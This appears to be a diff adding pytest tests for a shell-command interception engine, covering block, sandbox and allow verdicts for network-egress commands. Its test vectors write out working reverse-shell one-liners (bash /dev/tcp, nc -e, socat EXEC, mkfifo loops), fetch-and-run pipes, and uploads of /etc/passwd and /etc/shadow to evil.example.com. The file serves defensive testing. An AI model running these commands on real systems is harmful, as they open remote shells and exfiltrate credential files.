@@ -209,11 +209,12 @@ class TestNoSandboxContract:
     """E2E-001-GAP-02 — doc-vs-engine contract lock.
 
     specs/integration.md previously claimed curl/wget/apt/docker were
-    auto-sandboxed. The engine ships exactly 8 sandbox rules (test runners,
-    build tools, pip install, script execution). Plain network downloads,
-    package-manager updates, and container queries must stay ALLOW — only
-    download-to-shell pipelines (curl | sh) are blocklisted. These tests pin
-    the engine behavior so the doc cannot drift from the implementation again.
+    auto-sandboxed. The engine's sandbox layer covers test runners, build
+    tools, pip install and script execution (TJ-GAP-058 later added dual-use
+    network-egress shapes). Plain network downloads, package-manager updates,
+    and container queries must stay ALLOW — only download-to-shell pipelines
+    (curl | sh) are blocklisted. These tests pin the engine behavior so the
+    doc cannot drift from the implementation again.
     """
 
     @pytest.mark.parametrize(
@@ -299,6 +300,363 @@ class TestAllowlist:
         result = intercept(command)
         assert result.action == Action.ALLOW, (
             f"Expected ALLOW for {command!r}, got {result.action}"
+        )
+
+
+# =============================================================================
+# Network egress rules (TJ-GAP-058)
+#
+# 2026-09-16 research: network egress was the largest wholly-uncovered class —
+# nothing in the engine touched it, so `bash -i >& /dev/tcp/host/port 0>&1`,
+# `nc -e /bin/sh`, `socat ... EXEC:/bin/sh` and friends all returned plain
+# ALLOW. The verdict design matters more than the pattern count:
+#   unambiguous reverse-shell shapes  -> BLOCK  (priority-1000 blocklist)
+#   fleet-legit traffic (ssh/scp/git push/port checks) -> ALLOW, pinned here
+#   gray / dual-use egress             -> MODIFY (auto-sandbox, namespace wrap)
+# Every vector below was a live ALLOW verdict before its rule landed.
+# =============================================================================
+
+# (name, command, expected rule id)
+NET_BLOCK_VECTORS = [
+    # /dev/tcp | /dev/udp redirect reverse shells
+    ("devtcp-bash-redirect", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "builtin-net-devtcp-redirect"),
+    ("devtcp-exec-fd", "exec 3<>/dev/tcp/10.0.0.1/4444", "builtin-net-devtcp-redirect"),
+    ("devtcp-cat-input", "cat < /dev/tcp/10.0.0.1/8080", "builtin-net-devtcp-redirect"),
+    ("devudp-exec-fd", "exec 3<>/dev/udp/10.0.0.1/53", "builtin-net-devtcp-redirect"),
+    ("devudp-write", "bash -c 'echo stats > /dev/udp/1.2.3.4/8125'", "builtin-net-devtcp-redirect"),
+    # nc / ncat / netcat with a shell attach
+    ("nc-exec-sh", "nc -e /bin/sh 10.0.0.1 4444", "builtin-net-nc-shell-attach"),
+    ("nc-exec-attached", "nc -e/bin/bash 10.0.0.1 4444", "builtin-net-nc-shell-attach"),
+    ("ncat-sh-exec", "ncat -c 'sh' 10.0.0.1 4444", "builtin-net-nc-shell-attach"),
+    ("ncat-exec-long", "ncat --exec /bin/bash 10.0.0.1 4444", "builtin-net-nc-shell-attach"),
+    ("nc-pipe-into-shell", "nc 10.0.0.1 4444 | sh", "builtin-net-nc-shell-attach"),
+    ("shell-pipe-into-nc", "bash -i 2>&1 | nc 10.0.0.1 4444", "builtin-net-nc-shell-attach"),
+    # socat EXEC:/SYSTEM: to a network endpoint
+    ("socat-exec-tcp", "socat TCP:10.0.0.1:4444 EXEC:/bin/sh", "builtin-net-socat-exec"),
+    (
+        "socat-exec-pty-tcp",
+        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
+        "builtin-net-socat-exec",
+    ),
+    (
+        "socat-listen-exec",
+        "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
+        "builtin-net-socat-exec",
+    ),
+    ("socat-system-udp", "socat UDP:10.0.0.1:5353 SYSTEM:'sh -c id'", "builtin-net-socat-exec"),
+    # mkfifo two-way plumbing loop
+    (
+        "mkfifo-loop",
+        "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
+        "builtin-net-mkfifo-reverse-shell",
+    ),
+    (
+        "mkfifo-loop-in-quoted-arg",
+        "sh -c 'mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f'",
+        "builtin-net-mkfifo-reverse-shell",
+    ),
+    # openssl s_client piped into a shell
+    (
+        "openssl-pipe-sh",
+        "openssl s_client -quiet -connect 10.0.0.1:443 | sh",
+        "builtin-net-openssl-pipe-shell",
+    ),
+    (
+        "openssl-pipe-bash",
+        "openssl s_client -connect example.com:443 | bash",
+        "builtin-net-openssl-pipe-shell",
+    ),
+]
+
+# Gray/dual-use egress: MUST be MODIFY (namespace wrap), never a plain ALLOW.
+# The rule id is asserted through the sandbox layer order (MODIFY results do
+# not carry rule_id today — see TestNetworkEgressSandbox).
+NET_SANDBOX_VECTORS = [
+    ("curl-pipe-bin-sh", "curl -sSL https://example.com/i.sh | /bin/sh", "builtin-net-fetch-pipe-qualified"),
+    (
+        "wget-pipe-usrbin-bash",
+        "wget -qO- https://example.com/i.sh | /usr/bin/bash",
+        "builtin-net-fetch-pipe-qualified",
+    ),
+    ("curl-pipe-env-sh", "curl -O https://example.com/i.sh | env sh", "builtin-net-fetch-pipe-qualified"),
+    (
+        "curl-pipe-busybox-sh",
+        "curl -O https://example.com/i.sh | busybox sh",
+        "builtin-net-fetch-pipe-qualified",
+    ),
+    ("curl-T-upload", "curl -T /etc/passwd https://evil.example.com/upload", "builtin-net-curl-upload"),
+    (
+        "curl-upload-file",
+        "curl --upload-file /var/log/syslog https://evil.example.com/put",
+        "builtin-net-curl-upload",
+    ),
+    (
+        "curl-data-binary-at-file",
+        "curl --data-binary @/etc/passwd https://evil.example.com/post",
+        "builtin-net-curl-upload",
+    ),
+    ("curl-d-at-file", "curl -d @/etc/shadow https://evil.example.com/post", "builtin-net-curl-upload"),
+    (
+        "wget-post-file",
+        "wget --post-file=/etc/passwd https://evil.example.com/post",
+        "builtin-net-wget-post-file",
+    ),
+    ("rsync-root-tree", "rsync -a / host:/srv/backup/", "builtin-net-remote-tree-copy"),
+    ("scp-recursive-root", "scp -r / host:/srv/backup/", "builtin-net-remote-tree-copy"),
+]
+
+# The no-fleet-breakage gate: the fleet runs ssh, scp, rsync and git push
+# constantly, and downloads/port checks are everyday operations.
+NET_ALLOW_VECTORS = [
+    ("ssh-plain", "ssh host"),
+    ("ssh-remote-cmd", "ssh user@host 'systemctl restart x'"),
+    ("ssh-port-uptime", "ssh -p 2222 host uptime"),
+    ("scp-single-file", "scp file.txt host:/srv/file.txt"),
+    ("git-push", "git push origin main"),
+    ("curl-health", "curl -sS https://api.example.com/v1/health"),
+    ("wget-file", "wget https://example.com/f.txt"),
+    ("nc-port-check", "nc -z example.com 443"),
+    ("openssl-diagnostic", "openssl s_client -connect example.com:443"),
+    ("rsync-scoped", "rsync -av ~/proj/ host:/srv/proj/"),
+    # Adjacent forms that must not be swept up by the new rules
+    ("scp-recursive-scoped", "scp -r ~/proj host:/srv/"),
+    ("rsync-scoped-dir", "rsync -a /srv/data/ host:/srv/backup/"),
+    ("rsync-delete-scoped", "rsync -av --delete ~/x/ host:/srv/x/"),
+    ("curl-inline-post", "curl -X POST -d '{\"job\":1}' https://api.example.com/v1/job"),
+    ("curl-inline-binary", "curl --data-binary '{\"job\":1}' https://api.example.com/v1/job"),
+    ("curl-save-output", "curl -fsSL https://example.com/f.tar.gz | tar xz"),
+    ("wget-output-file", "wget -O /tmp/f.tar.gz https://example.com/f.tar.gz"),
+    ("statsd-udp-pipe", "echo stats | nc -u -w1 localhost 8125"),
+    ("nc-listen", "nc -l 8080"),
+    ("openssl-tls-inspect", "openssl s_client -connect example.com:443 | openssl x509 -noout -dates"),
+    ("socat-listen-relay", "socat TCP-LISTEN:8080,fork,reuseaddr -"),
+    ("socat-relay-no-exec", "socat - TCP:127.0.0.1:9092"),
+    ("tar-over-ssh", "tar czf - /srv/data | ssh host 'cat > /srv/backup.tgz'"),
+    ("backup-then-pipe-nc", "bash -lc 'build.sh' && tar czf - /srv/data | nc host 9000"),
+    ("mkfifo-alone", "mkfifo /tmp/f"),
+    ("mkfifo-tail", "mkfifo /tmp/f; tail -f /tmp/f"),
+    ("devtcp-mention-grep", "grep -rn '/dev/tcp' docs/"),
+    ("devtcp-mention-echo", "echo 'see /dev/tcp docs'"),
+    # Interpreter invocations with no script operand stay out of the new
+    # sandbox rule's scope (it requires a path-qualified/wrapped shell).
+    ("bash-version", "bash --version"),
+    ("sh-c-inline", "sh -c 'echo hi'"),
+    ("bash-qualified-with-script", "/bin/bash -x deploy.sh"),
+]
+
+# The wrapper (standalone/terminal-jail) single-quotes every argv token; the
+# matcher compares the quote-stripped form too, so both spellings must block.
+NET_QUOTED_VECTORS = [
+    ("quoted-devtcp", "'bash' '-i' '>&' '/dev/tcp/1.2.3.4/4444' '0>&1'", "builtin-net-devtcp-redirect"),
+    ("quoted-nc-exec", "'nc' '-e' '/bin/sh' '10.0.0.1' '4444'", "builtin-net-nc-shell-attach"),
+    ("quoted-socat", "'socat' 'TCP:1.2.3.4:4444' 'EXEC:/bin/sh'", "builtin-net-socat-exec"),
+    (
+        "quoted-openssl-pipe",
+        "'openssl' 's_client' '-connect' '1.2.3.4:443' '|' 'sh'",
+        "builtin-net-openssl-pipe-shell",
+    ),
+]
+
+
+def _first_sandbox_rule(command: str) -> str | None:
+    """Name the auto-sandbox rule that claims ``command``.
+
+    The decider's aggregate MODIFY result drops ``rule_id`` (it reports the
+    generic "Command modified by auto-sandbox" reason), so this replays the
+    SAME order the engine uses — segments in order, then sandbox rules by
+    priority descending (stable sort == BUILTIN_SANDBOX file order for equal
+    priorities) — and returns the first rule that matches. User rules can only
+    override SAME-ID builtins, and these ids are new, so the builtin layer is
+    exactly what the engine evaluates for them.
+    """
+    from terminal_jail.interruptor.matcher import Matcher
+    from terminal_jail.interruptor.sandbox import BUILTIN_SANDBOX
+
+    matcher = Matcher()
+    layer = sorted(BUILTIN_SANDBOX, key=lambda rule: rule.priority, reverse=True)
+    for segment in parse_command(command.strip()):
+        for rule in layer:
+            if matcher.match_segment(segment, rule.match):
+                return rule.id
+    return None
+
+
+class TestNetworkEgressBlocks:
+    """TJ-GAP-058: reverse-shell / network-fd egress vectors block by id."""
+
+    @pytest.mark.parametrize(
+        "name,command,rule_id",
+        NET_BLOCK_VECTORS,
+        ids=[v[0] for v in NET_BLOCK_VECTORS],
+    )
+    def test_egress_vector_blocked(self, name: str, command: str, rule_id: str) -> None:
+        result = intercept(command)
+        assert result.action == Action.BLOCK, (
+            f"egress vector {name!r} is not blocked: {command!r} -> "
+            f"{result.action} (rule={result.rule_id!r})"
+        )
+        assert result.rule_id == rule_id, (
+            f"egress vector {name!r} claimed by wrong rule: expected "
+            f"{rule_id!r}, got {result.rule_id!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "name,command,rule_id",
+        NET_QUOTED_VECTORS,
+        ids=[v[0] for v in NET_QUOTED_VECTORS],
+    )
+    def test_wrapper_quoted_egress_vector_blocked(
+        self, name: str, command: str, rule_id: str
+    ) -> None:
+        """Wrapper-quoted argv (one quote pair per token) must block too."""
+        result = intercept(command)
+        assert result.action == Action.BLOCK, (
+            f"quoted egress vector {name!r} is not blocked: {command!r} -> "
+            f"{result.action} (rule={result.rule_id!r})"
+        )
+        assert result.rule_id == rule_id, (
+            f"quoted egress vector {name!r} claimed by wrong rule: expected "
+            f"{rule_id!r}, got {result.rule_id!r}"
+        )
+
+
+class TestNetworkEgressSandbox:
+    """TJ-GAP-058: dual-use egress is MODIFY (namespace wrap), never ALLOW."""
+
+    @pytest.mark.parametrize(
+        "name,command,rule_id",
+        NET_SANDBOX_VECTORS,
+        ids=[v[0] for v in NET_SANDBOX_VECTORS],
+    )
+    def test_dual_use_egress_sandboxed(self, name: str, command: str, rule_id: str) -> None:
+        """The sandbox verdict: action MODIFY + a namespace-wrapped command.
+
+        Rule-id provenance is asserted separately (``_first_sandbox_rule``)
+        because the decider's aggregate MODIFY result carries no rule_id —
+        same class of gap DF-TERMINAL-JAIL-12 closed for ALLOW verdicts.
+        The wrap prefix itself is host-dependent (userns probe), so the
+        assertion is "a different, wrapped command came back", not a literal
+        prefix — and NOT ``command in modified``: for a PIPELINE the decider
+        re-joins segments with a space, dropping the ``|`` (pre-existing,
+        affects every sandbox rule, reported as a separate finding).
+        """
+        result = intercept(command)
+        assert result.action == Action.MODIFY, (
+            f"dual-use egress {name!r} is not sandboxed: {command!r} -> "
+            f"{result.action} (rule={result.rule_id!r})"
+        )
+        assert result.modified, f"sandboxed {name!r} returned no wrapped command"
+        assert result.modified != command, (
+            f"sandboxed {name!r} came back unchanged: {result.modified!r}"
+        )
+        assert _first_sandbox_rule(command) == rule_id, (
+            f"dual-use egress {name!r} is not claimed by {rule_id!r}: "
+            f"got {_first_sandbox_rule(command)!r}"
+        )
+
+
+class TestNetworkEgressFetchPipeFamily:
+    """TJ-GAP-058 Deliverable 2.6: fetch pipes get a non-ALLOW verdict.
+
+    Live finding (probe 2026-09-16): the BARE interpreter forms named in the
+    brief (`wget -O- <url> | sh`, `wget -qO- <url> | bash`, `curl <url> | sh`)
+    are ALREADY covered one layer STRONGER by the pre-existing
+    ``builtin-curl-pipe-shell`` blocklist rule, which matches curl/wget
+    anywhere before a pipeline into a bare shell. No sandbox rule can shadow
+    that (the blocklist is layer 1 and a MODIFY rule for the same input would
+    be unreachable dead code), so these verdicts are pinned as BLOCK instead.
+    What the block rule CANNOT see is a PATH-QUALIFIED or WRAPPED interpreter
+    (`/bin/sh`, `/usr/bin/bash`, `env sh`, `busybox sh`) — that gap is real and
+    is closed by the ``builtin-net-fetch-pipe-qualified`` sandbox rule asserted
+    in TestNetworkEgressSandbox.
+    """
+
+    @pytest.mark.parametrize(
+        "name,command",
+        [
+            ("wget-pipe-sh", "wget -O- https://example.com/install.sh | sh"),
+            ("wget-pipe-bash", "wget -qO- https://example.com/install.sh | bash"),
+            ("curl-pipe-sh", "curl https://example.com/install.sh | sh"),
+        ],
+        ids=["wget-pipe-sh", "wget-pipe-bash", "curl-pipe-sh"],
+    )
+    def test_bare_fetch_pipe_blocked_by_existing_rule(self, name: str, command: str) -> None:
+        result = intercept(command)
+        assert result.action == Action.BLOCK, (
+            f"fetch pipe {name!r} lost its block: {command!r} -> {result.action}"
+        )
+        assert result.rule_id == "builtin-curl-pipe-shell", (
+            f"fetch pipe {name!r} claimed by unexpected rule: {result.rule_id!r}"
+        )
+
+
+class TestNetworkEgressAllows:
+    """TJ-GAP-058 Deliverable 3: the no-fleet-breakage gate."""
+
+    @pytest.mark.parametrize(
+        "name,command",
+        NET_ALLOW_VECTORS,
+        ids=[v[0] for v in NET_ALLOW_VECTORS],
+    )
+    def test_fleet_traffic_still_allowed(self, name: str, command: str) -> None:
+        result = intercept(command)
+        assert result.action == Action.ALLOW, (
+            f"legit egress {name!r} over-blocked: {command!r} -> "
+            f"{result.action} (rule={result.rule_id!r})"
+        )
+
+
+class TestNetworkEgressRuleRegistry:
+    """The new rules exist, in the right layer, with honest metadata."""
+
+    def test_new_block_rules_registered(self) -> None:
+        from terminal_jail.interruptor.blocklist import BUILTIN_BLOCKLIST
+
+        by_id = {rule.id: rule for rule in BUILTIN_BLOCKLIST}
+        expected = {rule_id for _, _, rule_id in NET_BLOCK_VECTORS}
+        for rule_id in sorted(expected):
+            assert rule_id in by_id, f"{rule_id} missing from BUILTIN_BLOCKLIST"
+            rule = by_id[rule_id]
+            assert rule.action == "block", f"{rule_id} action is {rule.action!r}"
+            assert rule.priority == 1000, f"{rule_id} priority is {rule.priority}"
+            assert rule.id.startswith("builtin-net-"), f"{rule_id} prefix drifted"
+            assert "blocked" in rule.block_message.lower(), (
+                f"{rule_id} block_message does not state that it blocks: "
+                f"{rule.block_message!r}"
+            )
+            assert rule.match.get("type") == "pattern"
+            assert rule.match.get("pattern"), f"{rule_id} has no pattern"
+
+    def test_new_sandbox_rules_registered(self) -> None:
+        from terminal_jail.interruptor.sandbox import BUILTIN_SANDBOX
+
+        by_id = {rule.id: rule for rule in BUILTIN_SANDBOX}
+        expected = {rule_id for _, _, rule_id in NET_SANDBOX_VECTORS}
+        for rule_id in sorted(expected):
+            assert rule_id in by_id, f"{rule_id} missing from BUILTIN_SANDBOX"
+            rule = by_id[rule_id]
+            assert rule.action == "sandbox", f"{rule_id} action is {rule.action!r}"
+            assert rule.priority == 700, f"{rule_id} priority is {rule.priority}"
+            assert rule.id.startswith("builtin-net-"), f"{rule_id} prefix drifted"
+            # The sandbox layer's message convention (auto-sandboxed, not blocked).
+            assert rule.block_message.startswith("Auto-sandboxed:"), (
+                f"{rule_id} block_message breaks the sandbox convention: "
+                f"{rule.block_message!r}"
+            )
+            assert rule.match.get("pattern"), f"{rule_id} has no pattern"
+
+    def test_mkfifo_rule_precedes_nc_rule(self) -> None:
+        """Layer order decides which id claims the fifo vector.
+
+        Both rules match the classic fifo loop; the more specific mkfifo rule
+        must stay ahead of builtin-net-nc-shell-attach in file order (equal
+        priorities keep file order), or the vector reports the wrong id.
+        """
+        from terminal_jail.interruptor.blocklist import BUILTIN_BLOCKLIST
+
+        ids = [rule.id for rule in BUILTIN_BLOCKLIST]
+        assert ids.index("builtin-net-mkfifo-reverse-shell") < ids.index(
+            "builtin-net-nc-shell-attach"
         )
 
 
